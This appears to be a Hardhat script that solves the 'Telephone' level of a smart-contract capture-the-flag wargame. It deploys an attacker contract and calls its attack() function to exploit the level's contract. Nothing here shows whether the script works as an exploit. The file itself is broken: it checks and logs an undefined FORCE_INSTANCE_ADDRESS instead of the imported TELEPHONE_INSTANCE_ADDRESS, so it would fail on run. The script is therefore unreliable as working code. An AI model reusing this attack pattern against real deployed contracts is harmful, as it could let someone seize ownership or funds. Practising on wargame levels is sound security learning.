const {
    TELEPHONE_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink,
} = require('./utils');

async function main(levelName = 'Telephone') {
    logStartingLevel(levelName);

    if (!FORCE_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, FORCE_INSTANCE_ADDRESS);

    const [attacker] = await ethers.getSigners();
    const factory = await ethers.getContractFactory("Telephone");
    const contract = factory.attach(TELEPHONE_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("TelephoneAttacker");
    const attackerContract = await attackerFactory.deploy(contract.address);
    await attackerContract.deployed();

    const tx = await attackerContract.connect(attacker).attack(attacker.address);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

module.exports = main;
